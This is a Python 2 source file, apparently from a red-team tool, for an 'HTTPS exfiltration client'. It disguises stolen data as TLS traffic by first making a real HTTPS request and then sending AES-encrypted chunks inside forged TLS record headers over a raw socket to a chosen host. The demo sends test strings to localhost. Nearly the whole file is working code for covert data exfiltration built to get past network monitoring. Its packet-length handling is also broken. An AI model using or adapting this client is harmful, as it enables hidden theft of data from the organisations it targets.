

import sys
import time
import socket
import hashlib
import urllib2

from Crypto import Random
from Crypto.Cipher import AES


# Setting timeout so that we won't wait forever
timeout = 2
socket.setdefaulttimeout(timeout)


class AESCipher(object):

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        # enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]


class HTTPSExfiltrationClient():

    def __init__(self, host, key, port=443, max_size=8192):
        self.host = host
        self.port = port
        self.max_size = max_size
        self.AESDriver = AESCipher(key=key)

        self.sock = None

        # Initiate the socket
        check = self._pretendSSL()
        if check is not 0:
            sys.exit(1)
        check = self._createRealSocket()
        if check is not 0:
            sys.exit(1)


    def _pretendSSL(self):
        try:
            response = urllib2.urlopen('https://%s:%s/' % (self.host, self.port))
            html = response.read()
        except urllib2.URLError, e:
            return 0
        except socket.error, e:
            sys.stderr.write("[!]\tCould not reach server to fake SSL handshake!\n")
            return 1


    def _createRealSocket(self):
        try:
            sock = socket.socket()
            sock.connect((self.host, self.port))
            self.sock = sock
            return 0
        except socket.error, e:
            sys.stderr.write("[!]\tCould not setup a connection to %s. Error:\n%s.\n" % (self.host, e))
            return 1


    def sendData(self, data):
        time.sleep(0.1)
        if self._createRealSocket() is 1:
            return 1

        dat = self.AESDriver.encrypt(data)

        packet_length = chr(len(dat))
        if len(packet_length) == 1:
            packet_length = "\x00" + packet_length
        elif len(packet_length) == 2:
            pass
        else:
            sys.stderr.write("[!]\tPacket is too big.\n")
            return 1

        pckt = "\x17\x03\x03"+packet_length+dat
        self.sock.send(pckt)
        self.sock.close()
        sys.stdout.write("[.]\tSent '%s/%s'.\n" % (len(dat), len(pckt)))
        return 0

    def close(self):
        self._createRealSocket()
        time.sleep(0.1)
        self.sock.send("\x17\x03\x03\x16\x05\x16")
        self.sock.close()
        return 0


if __name__ == "__main__":
    client = HTTPSExfiltrationClient(host='127.0.0.1', key="123")
    client.sendData("ABC")
    client.sendData("DEFG")
    client.close()
